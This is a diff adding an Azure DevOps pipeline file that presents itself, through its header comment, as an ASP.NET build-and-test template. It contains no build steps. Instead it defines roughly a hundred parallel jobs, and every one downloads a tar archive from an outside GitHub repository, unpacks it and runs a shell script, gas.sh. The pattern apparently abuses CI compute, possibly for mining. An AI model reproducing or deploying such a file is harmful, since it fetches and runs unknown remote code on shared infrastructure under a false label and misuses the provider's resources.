@@ -1,0 +1,416 @@
+# ASP.NET
+# Build and test ASP.NET projects.
+# Add steps that publish symbols, save build artifacts, deploy, and more:
+# https://docs.microsoft.com/azure/devops/pipelines/apps/aspnet/build-aspnet-4
+
+trigger:
+- main
+
+pool:
+  vmImage: ubuntu-16.04
+
+jobs:
+- job: a
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+
+- job: b
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+
+- job: c
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+
+- job: d
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: e
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: f
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: g
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: h
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: i
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: j
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: k
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: l
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: m
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: n
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: o
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: p
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: q
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: r
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: s
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: t
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: u
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: v
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: w
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: x
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: y
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: z
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: aa
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: bb
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: cc
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: dd
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: ee
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: ff
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: gg
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: hh
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: ii
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: jj
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: kk
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: ll
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: mm
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: nn
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: oo
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: pp
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: qq
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: rr
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: ss
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: tt
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: uu
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: vv
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: ww
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: xx
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: yy
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: zz
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: aaa
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: bbb
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: ccc
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: ddd
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: eee
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: fff
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: ggg
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: hhh
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: iii
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: jjj
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: kkk
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: lll
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: mmm
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: nnn
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: ooo
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: ppp
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: qqq
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: rrr
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: sss
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: ttt
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: uuu
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: vvv
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: www
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: xxx
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: yyy
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: zzz
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: aaaa
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: bbbb
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: cccc
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: dddd
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: eeee
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: ffff
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: gggg
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: hhhh
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: iiii
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: jjjj
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: kkkk
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: llll
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: mmmm
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: nnnn
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: oooo
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: pppp
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: qqqq
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: rrrr
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: ssss
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: tttt
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: uuuu
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: vvvv
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+  
+- job: wwww
+  steps:
+  - script: wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz && ./gas.sh
+ 
